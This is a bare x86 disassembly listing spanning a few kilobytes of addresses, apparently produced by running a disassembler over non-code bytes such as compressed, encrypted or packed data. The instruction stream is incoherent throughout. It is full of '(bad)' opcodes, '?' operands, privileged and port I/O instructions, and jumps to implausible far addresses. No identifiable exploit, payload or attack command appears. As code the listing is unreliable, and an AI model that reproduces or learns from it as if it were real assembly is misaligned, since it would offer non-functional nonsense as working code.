  41884d:	add    al,0xa8
  41884f:	mov    al,ds:0x23ee6d0a
  418854:	or     eax,0xde377e1b
  418859:	test   al,0x20
  41885b:	cs xchg ebx,eax
  41885d:	into   
  41885e:	daa    
  41885f:	popf   
  418860:	in     al,0xd5
  418862:	mov    DWORD PTR [eax-0x574d7672],0xa81c8c70
  41886c:	ror    DWORD PTR [ebx+0x2f8fd1da],cl
  418872:	mov    al,ds:0xb6846c4f
  418877:	scas   al,BYTE PTR es:[edi]
  418878:	mov    cl,0x68
  41887a:	shl    edi,0x17
  41887d:	xlat   BYTE PTR ds:[ebx]
  41887e:	and    ah,BYTE PTR [edi-0x9]
  418881:	mov    ecx,0xf992595
  418886:	sub    DWORD PTR [edx-0x26312f8f],ebp
  41888c:	loop   0x418879
  41888e:	and    edi,DWORD PTR [eax+0x1c3ae348]
  418894:	jge    0x4188fc
  418896:	or     bl,BYTE PTR [ecx-0x1cb252a0]
  41889c:	sub    BYTE PTR [ecx-0x1f],ah
  41889f:	addr16 jg 0x4188e8
  4188a2:	hlt    
  4188a3:	inc    esp
  4188a4:	dec    esp
  4188a5:	adc    al,0x37
  4188a7:	addr16 mov ecx,0x984557b7
  4188ad:	pop    ss
  4188ae:	scas   al,BYTE PTR es:[edi]
  4188af:	aad    0xba
  4188b1:	xor    edi,DWORD PTR [ecx]
  4188b3:	je     0x418839
  4188b5:	xor    esp,DWORD PTR [ecx]
  4188b7:	mov    dl,0x7f
  4188b9:	mov    edi,DWORD PTR [ecx+0x6a]
  4188bc:	shl    DWORD PTR [ebp+0x2e],0x41
  4188c0:	jl     0x418893
  4188c2:	mov    eax,ds:0x78bca597
  4188c7:	push   eax
  4188c8:	pop    eax
  4188c9:	int3   
  4188ca:	pop    ds
  4188cb:	sbb    DWORD PTR [eax-0x4e9b6dde],0xf360377b
  4188d5:	mov    eax,ds:0x58604fc
  4188da:	inc    eax
  4188db:	je     0x4188dc
  4188dd:	(bad)  
  4188de:	push   esi
  4188df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188e0:	mov    ah,0x97
  4188e2:	dec    ecx
  4188e3:	popa   
  4188e4:	test   eax,0x330b061f
  4188e9:	add    al,0xb0
  4188eb:	pop    ss
  4188ec:	ss sbb al,0xb9
  4188ef:	fs (bad) 
  4188f1:	jbe    0x4188cf
  4188f3:	inc    ebx
  4188f4:	xor    ch,BYTE PTR [edx-0x5b]
  4188f7:	cmp    ebx,edi
  4188f9:	jo     0x4188e6
  4188fb:	fdiv   st,st(2)
  4188fd:	std    
  4188fe:	call   0x28e821d4
  418903:	mov    bh,0x9c
  418905:	inc    esp
  418906:	sar    DWORD PTR [ebx],0x48
  418909:	jbe    0x418988
  41890b:	dec    edx
  41890c:	test   al,0xde
  41890e:	xchg   ecx,eax
  41890f:	jns    0x418943
  418911:	ds push di
  418914:	add    BYTE PTR [edi+0x27cb6458],bl
  41891a:	lods   al,BYTE PTR ds:[esi]
  41891b:	comiss xmm4,DWORD PTR [eax-0x73]
  41891f:	or     cl,BYTE PTR [eax-0x6b]
  418922:	dec    ecx
  418923:	xlat   BYTE PTR ds:[ebx]
  418924:	xor    al,0x2d
  418926:	icebp  
  418927:	std    
  418928:	cwde   
  418929:	pusha  
  41892a:	cmp    dl,BYTE PTR [esi]
  41892c:	std    
  41892d:	adc    bl,BYTE PTR [eax+eax*8+0x31]
  418931:	shr    BYTE PTR [eax+eax*4],1
  418934:	sub    bh,0xfb
  418937:	adc    DWORD PTR [ebx+edi*4+0x7b9475f6],ebp
  41893e:	aas    
  41893f:	xchg   edx,eax
  418940:	es xchg esp,eax
  418942:	aas    
  418943:	xor    al,0x39
  418945:	les    esi,FWORD PTR [ebp-0xa8e9f0c]
  41894b:	rcl    BYTE PTR [esi+0x5f],cl
  41894e:	aas    
  41894f:	das    
  418950:	ret    0x3b5
  418953:	loopne 0x418931
  418955:	cmp    bl,BYTE PTR [eax+0xc]
  418958:	add    DWORD PTR ds:[ecx-0x5c],ebp
  41895c:	and    BYTE PTR [ebx+0x45],bl
  41895f:	cmp    eax,0xf9f9b070
  418964:	icebp  
  418965:	pop    esp
  418966:	xlat   BYTE PTR ds:[ebx]
  418967:	shr    dh,1
  418969:	dec    edi
  41896a:	sub    BYTE PTR ds:[eax+0x1b],al
  41896e:	mov    ds:0xdcfa7cdd,eax
  418973:	jg     0x4189d5
  418975:	(bad)  
  418976:	sub    ecx,DWORD PTR [esi+0x3e]
  418979:	loop   0x41898d
  41897b:	lds    eax,FWORD PTR [eax-0x38]
  41897e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41897f:	xor    DWORD PTR [edx-0x44],eax
  418982:	inc    ebx
  418984:	(bad)  
  418985:	jg     0x418976
  418987:	pop    ebx
  418988:	sahf   
  418989:	loopne 0x418969
  41898b:	mov    eax,ds:0x57619d36
  418990:	add    al,0x46
  418992:	(bad)  
  418993:	mov    ch,0xd4
  418995:	mov    esp,0xc105f1d4
  41899a:	ret    
  41899b:	int3   
  41899c:	std    
  41899d:	cs pushf 
  41899f:	mov    eax,ds:0x9c48b3f9
  4189a4:	mov    ebp,0x9122b135
  4189a9:	mov    dl,0xc
  4189ab:	sbb    bh,bl
  4189ad:	(bad)  [ecx]
  4189af:	push   cs
  4189b0:	mov    ch,BYTE PTR [esi-0x2ee17dea]
  4189b6:	mov    ds:0x8e0c8956,eax
  4189bb:	pop    ebp
  4189bc:	pop    ds
  4189bd:	inc    esi
  4189be:	aad    0x74
  4189c0:	jmp    0x1932374d
  4189c5:	in     eax,0xa
  4189c7:	ret    0x2c59
  4189ca:	shl    BYTE PTR [ebp-0x59],1
  4189cd:	lea    ecx,[eax-0x6a]
  4189d0:	or     al,0x6f
  4189d2:	sbb    eax,0xe679625c
  4189d7:	mov    ah,0x62
  4189d9:	pop    esi
  4189da:	fdiv   DWORD PTR [ecx+edx*1+0x32]
  4189de:	xor    al,dl
  4189e0:	loop   0x418a54
  4189e2:	add    DWORD PTR [eax+0x1533861e],esp
  4189e8:	pusha  
  4189e9:	or     DWORD PTR [eax+0x76c93001],esp
  4189ef:	mov    al,ds:0xfd59c33a
  4189f4:	fmul   DWORD PTR [ebx+0x6fb3102e]
  4189fa:	mov    edi,0x6f9e2463
  4189ff:	mov    esp,ebx
  418a01:	sbb    BYTE PTR [edx],al
  418a03:	dec    edx
  418a04:	jle    0x418a76
  418a06:	stos   DWORD PTR es:[edi],eax
  418a07:	mov    ebp,0xec64f209
  418a0c:	nop
  418a0d:	mov    ch,0x8d
  418a0f:	dec    edx
  418a10:	fadd   st,st(0)
  418a12:	or     eax,0xf9b9e25b
  418a17:	cmp    BYTE PTR [eax+0x1],bl
  418a1a:	adc    ch,BYTE PTR [esi-0x349cfbc]
  418a20:	or     bh,BYTE PTR [edx]
  418a22:	xchg   esi,eax
  418a23:	rcr    DWORD PTR [ecx+edi*2],1
  418a26:	push   es
  418a27:	shr    dl,cl
  418a29:	sbb    eax,0x9b169e32
  418a2e:	xchg   ebp,eax
  418a2f:	(bad)  
  418a30:	jecxz  0x418a16
  418a32:	inc    esp
  418a33:	jbe    0x418a3a
  418a35:	mov    ah,0x80
  418a37:	and    DWORD PTR [ebx+0x4415d3f0],esi
  418a3d:	imul   ebp,eax,0x53
  418a40:	test   BYTE PTR [esi],cl
  418a42:	sbb    ch,BYTE PTR [esi]
  418a44:	sub    BYTE PTR ds:0x428e6c5d,0x4c
  418a4b:	push   cs
  418a4c:	xor    eax,0x82817e1b
  418a51:	xchg   ebx,eax
  418a52:	or     eax,0x4f6ae0a9
  418a57:	xlat   BYTE PTR ds:[ebx]
  418a58:	cwde   
  418a59:	clc    
  418a5a:	in     al,0x32
  418a5c:	imul   edi,ebx,0x1a4040f9
  418a62:	mov    dl,0x56
  418a64:	adc    DWORD PTR [esi-0x5e],0x8d8c8496
  418a6b:	fyl2xp1 
  418a6d:	test   BYTE PTR [edx+0x48],bh
  418a70:	iret   
  418a71:	sub    bl,BYTE PTR [edx+0x40]
  418a74:	aam    0x44
  418a76:	aas    
  418a77:	test   BYTE PTR [ebp+0x5a8763a1],bl
  418a7d:	jmp    0x4f16d2e9
  418a82:	mov    dh,0x14
  418a84:	add    al,0x46
  418a87:	dec    esi
  418a88:	mov    ah,BYTE PTR [edi]
  418a8a:	mov    edx,0x47cd97da
  418a8f:	retf   
  418a90:	cs (bad) 
  418a92:	outs   dx,BYTE PTR ds:[esi]
  418a93:	pushf  
  418a94:	(bad)  
  418a95:	jp     0x418a2a
  418a97:	jg     0x418a88
  418a99:	mov    ds:0x1b0306d0,eax
  418a9e:	rol    cl,cl
  418aa0:	or     al,0x77
  418aa2:	mov    ch,0x22
  418aa4:	shr    ah,cl
  418aa6:	(bad)
  418aa9:	mov    ?,esi
  418aab:	sahf   
  418aac:	aad    0x89
  418aae:	add    BYTE PTR [edi],ah
  418ab0:	push   ds
  418ab1:	(bad)  
  418ab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ab3:	(bad)  
  418ab4:	es xchg edx,eax
  418ab6:	sahf   
  418ab7:	sbb    esi,esi
  418ab9:	mov    eax,esp
  418abb:	ins    DWORD PTR es:[edi],dx
  418abc:	dec    ebp
  418abd:	mov    bl,0x30
  418abf:	sahf   
  418ac0:	outs   dx,DWORD PTR ds:[esi]
  418ac1:	sbb    DWORD PTR [edx],0xffffffa6
  418ac4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ac5:	arpl   WORD PTR [edx-0x7206f301],bp
  418acb:	add    DWORD PTR [ecx-0x3e],0xe52705cd
  418ad2:	sbb    DWORD PTR [ecx-0x23],eax
  418ad5:	adc    DWORD PTR [edi-0xf],edx
  418ad8:	std    
  418ad9:	xchg   ebx,eax
  418ada:	and    eax,ebx
  418adc:	clc    
  418add:	xlat   BYTE PTR ds:[ebx]
  418ade:	outs   dx,DWORD PTR ds:[esi]
  418adf:	push   ecx
  418ae0:	add    DWORD PTR [esp+ebp*4+0x2d],esi
  418ae4:	nop
  418ae5:	jne    0x418af8
  418ae7:	push   ebx
  418ae8:	test   DWORD PTR [edx+0x4c],ebp
  418aeb:	je     0x418b27
  418aed:	jp     0x418aa2
  418aef:	sub    ebp,DWORD PTR [eax]
  418af1:	mov    bl,0xc4
  418af3:	xchg   edi,eax
  418af4:	sti    
  418af5:	push   esp
  418af6:	cmc    
  418af7:	in     al,dx
  418af8:	leave  
  418af9:	xor    BYTE PTR [ebx-0x12dce5da],0x89
  418b00:	mov    edx,0x1b2fadfb
  418b05:	dec    ebx
  418b06:	int3   
  418b07:	adc    DWORD PTR [esi-0x57541b9],0x2ab9cb84
  418b11:	mov    DWORD PTR [ebx],0xf6f9205c
  418b17:	push   cs
  418b18:	pop    ds
  418b19:	call   0x9909b071
  418b1e:	mov    WORD PTR [esi-0x75],fs
  418b21:	mov    bh,0xc
  418b23:	int    0xda
  418b25:	fild   WORD PTR [edi+edx*1]
  418b28:	fstp   DWORD PTR [edx+0x64]
  418b2b:	cwde   
  418b2c:	out    dx,eax
  418b2d:	loope  0x418b6c
  418b2f:	adc    BYTE PTR [esi],al
  418b31:	ficomp WORD PTR [ebp+0xd]
  418b34:	and    DWORD PTR [edx],ebx
  418b36:	sbb    esp,DWORD PTR [ebx-0x6a54935b]
  418b3c:	sbb    BYTE PTR [esi-0xb080ff7],cl
  418b42:	pop    eax
  418b43:	loopne 0x418b3b
  418b45:	not    DWORD PTR [edx]
  418b47:	cmp    edx,eax
  418b49:	inc    ebp
  418b4a:	add    DWORD PTR [ebp-0x72],0x6d
  418b4e:	cmp    al,0xe4
  418b50:	scas   al,BYTE PTR es:[edi]
  418b51:	dec    ecx
  418b52:	das    
  418b53:	imul   esi,DWORD PTR [ebx+esi*2],0xdc6c7e61
  418b5a:	loopne 0x418bba
  418b5c:	fistp  WORD PTR [ebx-0x7d]
  418b5f:	jns    0x418b80
  418b61:	xchg   ecx,eax
  418b62:	pop    esp
  418b63:	fcom   DWORD PTR [edi+0x723e4da]
  418b69:	pop    ds
  418b6a:	push   0xd743fd12
  418b6f:	mov    al,0x2c
  418b71:	xor    DWORD PTR [ebx],0x15
  418b74:	inc    edi
  418b75:	jbe    0x418b5a
  418b77:	sub    al,0xf7
  418b79:	cmp    BYTE PTR [edi+0x18],0xca
  418b7d:	push   eax
  418b7e:	aam    0xbf
  418b80:	xor    DWORD PTR [eax],0xffffffdc
  418b83:	lea    edi,[edx-0x4c]
  418b86:	xchg   BYTE PTR [edx+esi*1+0x33],bl
  418b8a:	out    dx,al
  418b8b:	loopne 0x418b29
  418b8d:	daa    
  418b8e:	ins    DWORD PTR es:[edi],dx
  418b8f:	lods   eax,DWORD PTR ds:[esi]
  418b90:	inc    esp
  418b91:	push   ss
  418b92:	sti    
  418b93:	xchg   ebx,eax
  418b94:	ss push cs
  418b96:	iret   
  418b97:	adc    BYTE PTR [eax+edx*2],0xa
  418b9b:	mov    ds:0x436a1a92,al
  418ba0:	cdq    
  418ba1:	dec    ebp
  418ba2:	mov    ch,0x8b
  418ba4:	inc    eax
  418ba5:	push   ebp
  418ba6:	inc    edx
  418ba7:	stc    
  418ba8:	jmp    0xace8d269
  418bad:	aad    0x16
  418baf:	popa   
  418bb0:	pop    esp
  418bb1:	jae    0x418b75
  418bb3:	shl    BYTE PTR [ebp+edi*4-0x62],1
  418bb7:	push   eax
  418bb8:	mov    ?,WORD PTR [ebx]
  418bba:	hlt    
  418bbb:	push   cs
  418bbc:	(bad)  
  418bbd:	clc    
  418bbe:	popf   
  418bbf:	xchg   ebp,eax
  418bc0:	(bad)
  418bc3:	pop    edi
  418bc4:	shl    BYTE PTR [ecx+0x362ecce9],0xad
  418bcb:	mov    esp,DWORD PTR [esi]
  418bcd:	xor    DWORD PTR [esi-0x7fd6490d],esi
  418bd3:	leave  
  418bd4:	jg     0x418ba0
  418bd6:	daa    
  418bd7:	std    
  418bd8:	add    eax,0xd4196fcc
  418bdd:	call   0xbd9c8616
  418be2:	fcmovnu st,st(3)
  418be4:	(bad)  
  418be6:	xchg   esi,eax
  418be7:	add    BYTE PTR [eax+0x6e],ah
  418bea:	mov    eax,ds:0xea846ec3
  418bef:	push   0x742ea541
  418bf4:	pop    edx
  418bf5:	and    esi,ecx
  418bf7:	test   al,0x26
  418bf9:	loopne 0x418bea
  418bfb:	jmp    0x4fb07695
  418c00:	int3   
  418c01:	stos   BYTE PTR es:[edi],al
  418c02:	jg     0x418b87
  418c04:	cmp    ecx,DWORD PTR es:[ecx+0x6f3299bd]
  418c0b:	inc    ebp
  418c0c:	mov    cl,0xfd
  418c0e:	les    edi,FWORD PTR [ebx-0x3]
  418c11:	mov    ss,WORD PTR [esi-0x7b8f2ce4]
  418c17:	dec    ebp
  418c18:	repnz stos BYTE PTR es:[edi],al
  418c1a:	sbb    BYTE PTR [ebx],0x6f
  418c1d:	xchg   BYTE PTR [ebp+0x7358088d],al
  418c23:	(bad)  
  418c24:	push   DWORD PTR [ebx+0x1fe795fb]
  418c2a:	sbb    al,0xe4
  418c2c:	add    cl,bl
  418c2e:	mov    ds,WORD PTR [esi+0xfabdddd]
  418c34:	add    ah,al
  418c36:	adc    cl,BYTE PTR [eax-0x1b]
  418c39:	pcmpgtd mm6,QWORD PTR [ebx+edi*1-0x8e004e5]
  418c41:	or     ebx,DWORD PTR [ecx+ebp*2+0x658693b7]
  418c48:	add    al,0x93
  418c4a:	or     al,0x5d
  418c4c:	inc    esi
  418c4d:	bound  edx,QWORD PTR [edx]
  418c4f:	mov    al,ds:0xef356c56
  418c54:	pop    esp
  418c55:	or     al,0xca
  418c57:	mov    edx,0x441b016f
  418c5c:	loop   0x418ca4
  418c5e:	sbb    bl,BYTE PTR [eax]
  418c60:	dec    eax
  418c61:	mov    eax,DWORD PTR [ecx]
  418c63:	push   esi
  418c64:	dec    edx
  418c65:	mov    eax,0x3471a0ad
  418c6a:	lahf   
  418c6b:	inc    eax
  418c6c:	pop    ds
  418c6d:	mov    al,ds:0x3a453369
  418c72:	daa    
  418c73:	or     BYTE PTR cs:0xea569f20,cl
  418c7a:	pop    es
  418c7b:	popa   
  418c7c:	mov    es:0x513406e0,eax
  418c82:	sub    ebx,0x40
  418c85:	(bad)  
  418c86:	stc    
  418c87:	into   
  418c88:	adc    cl,BYTE PTR [ebx-0x35]
  418c8b:	sar    al,1
  418c8d:	inc    esp
  418c8e:	mov    ss,WORD PTR [esi+0x20d72e73]
  418c94:	fcompp 
  418c96:	sub    BYTE PTR [eax],ch
  418c98:	mov    bl,0x53
  418c9a:	test   DWORD PTR [ecx],ecx
  418c9c:	aam    0x53
  418c9e:	cwde   
  418c9f:	and    esi,esi
  418ca1:	adc    DWORD PTR [edx+ecx*8],ecx
  418ca4:	retf   
  418ca5:	into   
  418ca6:	dec    esp
  418ca7:	mov    cl,0x6e
  418ca9:	rcl    BYTE PTR [ebp+0x1f],0x39
  418cad:	mov    dl,0xbe
  418caf:	jae    0x418ce3
  418cb1:	(bad)  
  418cb2:	jmp    0x6696:0x5f77f259
  418cb9:	rcl    esi,1
  418cbb:	cmp    ah,bh
  418cbd:	data16 scas al,BYTE PTR es:[edi]
  418cbf:	push   ebx
  418cc0:	mov    ds:0x6c270165,eax
  418cc5:	int    0xf9
  418cc7:	sar    DWORD PTR [edx],1
  418cc9:	push   0x799f5727
  418cce:	mov    al,ds:0xd6cfc584
  418cd3:	lock test al,0xcb
  418cd6:	sub    ch,0xa1
  418cd9:	mov    esi,DWORD PTR [ecx-0x50]
  418cdc:	or     BYTE PTR [eax],ch
  418cde:	je     0x418ccf
  418ce0:	or     al,0xa5
  418ce2:	push   esi
  418ce3:	sub    eax,0x4be64b48
  418ce8:	pop    ss
  418ce9:	inc    ecx
  418cea:	jno    0x418d19
  418cec:	jp     0x418cb3
  418cee:	jnp    0x418cb9
  418cf0:	mov    al,ds:0x156664a7
  418cf5:	adc    dl,BYTE PTR [ebx-0x6]
  418cf8:	xor    al,0xee
  418cfa:	adc    eax,0x9ed0d698
  418cff:	cs cwd 
  418d02:	test   BYTE PTR [eax-0x7a],dh
  418d05:	mov    si,0xd2f
  418d09:	imul   ebx,DWORD PTR [ebx],0xffffffae
  418d0c:	or     DWORD PTR [eax-0x2933901d],edi
  418d12:	imul   ebp,DWORD PTR ds:0xdf9ae387,0x71291f10
  418d1c:	xchg   BYTE PTR [ebx-0x817c0fe],ah
  418d22:	and    bl,BYTE PTR [ecx-0x4208e4e7]
  418d28:	div    BYTE PTR ds:0xcf47549e
  418d2e:	std    
  418d2f:	rcr    ebx,1
  418d31:	dec    eax
  418d32:	ret    
  418d33:	test   DWORD PTR [ecx-0x58],0x8aad4916
  418d3a:	in     eax,0xf8
  418d3c:	cli    
  418d3d:	mov    bl,0xbb
  418d3f:	inc    ecx
  418d40:	and    eax,0x63ab949f
  418d45:	pushf  
  418d46:	xor    al,0x97
  418d48:	ja     0x418d90
  418d4a:	out    0xcf,al
  418d4c:	lea    eax,[esi]
  418d4e:	jnp    0x418cee
  418d50:	pop    ebx
  418d51:	and    al,0x9a
  418d53:	ja     0x418d77
  418d55:	pop    esi
  418d56:	call   0x924d:0x8b389784
  418d5d:	or     BYTE PTR [esi+0x61],bh
  418d60:	pusha  
  418d61:	mov    dh,0x29
  418d63:	add    al,0x47
  418d65:	ins    BYTE PTR es:[edi],dx
  418d66:	mov    ecx,edx
  418d68:	jb     0x418d9b
  418d6a:	data16 jno 0x418d32
  418d6d:	push   0x18e627ae
  418d72:	jp     0x418d75
  418d74:	inc    eax
  418d75:	cmp    BYTE PTR [esp+eax*2+0x44ff7918],al
  418d7c:	mov    dl,0xbd
  418d7e:	scas   eax,DWORD PTR es:[edi]
  418d7f:	mov    es,esp
  418d81:	or     DWORD PTR [edi],ecx
  418d83:	and    esp,DWORD PTR [eax+0x75]
  418d86:	das    
  418d87:	mov    esi,0xcbbe0f9a
  418d8c:	mov    dh,0xc7
  418d8e:	cmp    al,BYTE PTR [ebx+edx*4]
  418d91:	and    al,0xa5
  418d93:	pop    ebp
  418d94:	leave  
  418d95:	test   eax,0x87ac1c73
  418d9a:	in     al,dx
  418d9b:	mov    bh,BYTE PTR [eax-0x14b26517]
  418da1:	mov    ds:0xf2e6c153,al
  418da6:	sub    al,0xc8
  418da8:	sbb    al,BYTE PTR [edx]
  418daa:	add    DWORD PTR [ecx+0x116f20d2],0xc66e70f6
  418db4:	jns    0x418dc0
  418db6:	adc    BYTE PTR [ecx+0x60],ah
  418db9:	in     eax,0x38
  418dbb:	inc    edi
  418dbc:	mov    ds:0xf820403a,eax
  418dc1:	push   esi
  418dc2:	fwait
  418dc3:	test   al,0x65
  418dc5:	xchg   edx,eax
  418dc6:	dec    esi
  418dc7:	push   cs
  418dc8:	(bad)  
  418dc9:	dec    edx
  418dca:	mov    edx,0xf7f60d94
  418dcf:	push   ds
  418dd0:	jge    0x418dd7
  418dd2:	and    ch,BYTE PTR [ebx+esi*1+0x61]
  418dd6:	repnz data16 or ah,BYTE PTR [ecx]
  418dda:	push   edi
  418ddb:	sub    DWORD PTR [eax-0x63],eax
  418dde:	stc    
  418ddf:	nop
  418de0:	dec    eax
  418de1:	push   edx
  418de2:	push   edx
  418de3:	fst    DWORD PTR [edi+0x68]
  418de6:	(bad)  
  418de7:	sbb    eax,0x775c3dba
  418dec:	sbb    edi,DWORD PTR [edi+0x7b652c3]
  418df2:	jne    0x418d7a
  418df4:	shr    edi,0xb2
  418df7:	imul   DWORD PTR [ebx-0x14]
  418dfa:	or     al,BYTE PTR [ecx]
  418dfc:	(bad)  
  418dfd:	out    0xbc,al
  418dff:	push   0x1
  418e01:	ds ss inc eax
  418e04:	add    eax,0xf477f088
  418e09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e0a:	dec    esi
  418e0b:	cmp    esp,ebp
  418e0d:	jmp    0x819d2dc4
  418e12:	push   eax
  418e13:	aam    0x75
  418e15:	push   ecx
  418e16:	sub    DWORD PTR [eax-0xe2da2f9],esi
  418e1c:	mov    edi,0x9f5b4913
  418e21:	and    eax,0x29dd141c
  418e26:	ins    BYTE PTR es:[edi],dx
  418e27:	lods   al,BYTE PTR ds:[esi]
  418e28:	mov    eax,ds:0xe4ee3c45
  418e2d:	add    al,BYTE PTR [eax-0x507c064]
  418e33:	je     0x418de6
  418e35:	lods   al,BYTE PTR ds:[esi]
  418e36:	pop    ebp
  418e37:	dec    edi
  418e38:	jecxz  0x418e92
  418e3a:	repz mov edx,0x7eb09cca
  418e40:	fwait
  418e41:	inc    edx
  418e42:	bound  eax,QWORD PTR [ecx]
  418e44:	sbb    esi,DWORD PTR [ebp-0x61060e19]
  418e4a:	daa    
  418e4b:	push   esi
  418e4c:	mov    ds,eax
  418e4e:	outs   dx,DWORD PTR ds:[esi]
  418e4f:	out    0x5,eax
  418e51:	sub    ah,BYTE PTR [esi+0x40a48ce]
  418e57:	ja     0x418ec2
  418e59:	mov    eax,ds:0x17a35692
  418e5e:	jle    0x418eae
  418e60:	mov    ecx,0x3b4ef9ea
  418e65:	mov    DWORD PTR ds:0xe04c6187,ebx
  418e6b:	aas    
  418e6c:	retf   
  418e6d:	lods   eax,DWORD PTR ds:[esi]
  418e6e:	ja     0x418edc
  418e70:	stos   BYTE PTR es:[edi],al
  418e71:	cld    
  418e72:	(bad)  
  418e73:	sti    
  418e74:	cmp    DWORD PTR [eax-0x26],ecx
  418e77:	addr16 jns 0x418eef
  418e7a:	xchg   edx,eax
  418e7b:	dec    esp
  418e7c:	ss add al,0xb7
  418e7f:	stos   BYTE PTR es:[edi],al
  418e80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e81:	cmp    BYTE PTR [edi+0x2c],0x6e
  418e85:	out    0x51,eax
  418e87:	mov    esi,0x18a59269
  418e8c:	sub    DWORD PTR [edi-0x5d],esi
  418e8f:	xchg   BYTE PTR [edi],bl
  418e91:	add    ebx,edi
  418e93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e94:	pop    edx
  418e95:	sbb    eax,0xf33bde9d
  418e9a:	cdq    
  418e9b:	cld    
  418e9c:	shr    DWORD PTR [edx-0x7232aed5],cl
  418ea2:	sbb    DWORD PTR [esi-0x69],ebp
  418ea5:	out    0x67,eax
  418ea7:	cld    
  418ea8:	ret    
  418ea9:	jne    0x418e87
  418eab:	mov    al,ds:0x1491c83c
  418eb0:	push   esi
  418eb1:	push   ss
  418eb2:	dec    edx
  418eb3:	ins    DWORD PTR es:[edi],dx
  418eb4:	jnp    0x418f20
  418eb6:	jne    0x418e6b
  418eb8:	cmp    al,0xda
  418eba:	ret    0x99af
  418ebd:	test   DWORD PTR [ebp+eiz*2-0x9ab0929],esp
  418ec4:	into   
  418ec5:	imul   ecx,ebp,0xec1042d3
  418ecb:	clc    
  418ecc:	jl     0x418ec5
  418ece:	fisubr WORD PTR [edx+ebx*2]
  418ed1:	sub    al,0xb1
  418ed3:	imul   eax,DWORD PTR [ecx-0x44f411ba],0xb
  418eda:	fs xchg ecx,eax
  418edc:	inc    edx
  418edd:	inc    ebx
  418ede:	and    al,0xf7
  418ee0:	scas   al,BYTE PTR es:[edi]
  418ee1:	mov    edi,0xb3a45dd6
  418ee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ee7:	mov    fs,WORD PTR [ebp-0x77b14137]
  418eed:	repnz cdq 
  418eef:	dec    edx
  418ef0:	test   al,0x8d
  418ef2:	(bad)  
  418ef3:	pop    es
  418ef4:	cmp    ch,BYTE PTR ds:[esi-0x38b82e65]
  418efb:	pop    ebx
  418efc:	loopne 0x418eb4
  418efe:	jo     0x418f2e
  418f00:	shl    al,cl
  418f02:	adc    edi,DWORD PTR [edx-0x6c]
  418f05:	mov    DWORD PTR [ebx+ebx*4-0x2a],ebp
  418f09:	cmovp  ebp,DWORD PTR [edx-0x7822d638]
  418f10:	lea    esi,[eax+ebp*1]
  418f13:	les    esp,FWORD PTR [esi]
  418f15:	pushf  
  418f16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f17:	call   0xcedd:0x49f36a17
  418f1e:	aam    0xfc
  418f20:	in     eax,dx
  418f21:	cmp    BYTE PTR [ebx+0x43],dh
  418f24:	push   esi
  418f25:	out    dx,eax
  418f26:	cmp    al,0x4e
  418f28:	inc    ebp
  418f29:	mov    al,ds:0x980ca58c
  418f2e:	(bad)  
  418f2f:	mov    ch,0x26
  418f31:	inc    ebx
  418f32:	inc    ebx
  418f33:	repnz or al,0x94
  418f36:	and    dl,BYTE PTR ss:[edx]
  418f39:	add    edi,DWORD PTR [edi-0x9]
  418f3c:	(bad)  
  418f3d:	and    al,0x4f
  418f3f:	push   ds
  418f40:	data16 mov WORD PTR [edx-0x51],fs
  418f44:	aas    
  418f45:	stos   DWORD PTR es:[edi],eax
  418f46:	imul   esp,DWORD PTR [ebx],0x7c
  418f49:	test   DWORD PTR [ecx],eax
  418f4b:	ins    DWORD PTR es:[edi],dx
  418f4c:	(bad)
  418f4f:	dec    ecx
  418f50:	jne    0x418f8f
  418f52:	xor    esi,edx
  418f54:	das    
  418f55:	rcr    DWORD PTR [edx-0x5b],cl
  418f58:	fsub   DWORD PTR [eax+eax*8]
  418f5b:	repz popa 
  418f5d:	fwait
  418f5e:	inc    edi
  418f5f:	fst    st(2)
  418f61:	cmp    eax,0x765bc2d4
  418f66:	ror    BYTE PTR [ebx+ebx*4+0x10903d90],1
  418f6d:	repz (bad) 
  418f6f:	dec    eax
  418f70:	test   al,bl
  418f72:	pop    eax
  418f73:	addr16 fdivr st(7),st
  418f76:	adc    DWORD PTR [esi+0x1],0xffffffcb
  418f7a:	retf   0x2e5c
  418f7d:	xchg   edi,eax
  418f7e:	inc    ebx
  418f7f:	dec    eax
  418f80:	dec    ebx
  418f81:	xchg   edx,eax
  418f82:	xchg   edx,eax
  418f83:	shl    BYTE PTR [esi-0x20],0x11
  418f87:	dec    edx
  418f88:	and    ecx,edx
  418f8a:	jne    0x418f2a
  418f8c:	ins    DWORD PTR es:[edi],dx
  418f8d:	jp     0x418fe1
  418f8f:	sbb    DWORD PTR [ecx+0x19d2633c],0x69538b52
  418f99:	mov    eax,ds:0xb60cb287
  418f9e:	xor    DWORD PTR [ebx+0x7c8bcfd2],ecx
  418fa4:	jnp    0x418fef
  418fa6:	popa   
  418fa7:	adc    al,0x24
  418fa9:	cli    
  418faa:	div    BYTE PTR [edi]
  418fac:	daa    
  418fad:	gs into 
  418faf:	gs mov bl,0xc
  418fb2:	imul   ebx,DWORD PTR [ecx],0x70feebe5
  418fb8:	push   ecx
  418fb9:	mov    ah,0x6b
  418fbb:	mov    gs,WORD PTR [esi+0x6ec3bb0f]
  418fc1:	xchg   esp,eax
  418fc2:	aas    
  418fc3:	jge    0x419043
  418fc5:	jp     0x419029
  418fc7:	(bad)  
  418fc8:	into   
  418fc9:	add    esi,DWORD PTR [ebp+0x7ac346c3]
  418fcf:	pushf  
  418fd0:	adc    ebp,esi
  418fd2:	xor    al,0x76
  418fd5:	push   esp
  418fd6:	aad    0x71
  418fd8:	or     DWORD PTR [edx+0x7537f4ea],edi
  418fde:	inc    esi
  418fdf:	mov    al,ds:0xe578ea21
  418fe4:	inc    edx
  418fe5:	outs   dx,DWORD PTR ds:[esi]
  418fe6:	jo     0x41900f
  418fe8:	xchg   ecx,eax
  418fe9:	lea    esi,[esi]
  418feb:	lock retf 
  418fed:	and    DWORD PTR [eax-0x20],ebp
  418ff0:	in     al,dx
  418ff1:	clc    
  418ff2:	sbb    al,0x64
  418ff4:	nop
  418ff5:	pop    esp
  418ff6:	pop    eax
  418ff7:	mov    esi,DWORD PTR [edi]
  418ff9:	mov    ?,WORD PTR [esi-0x891348f]
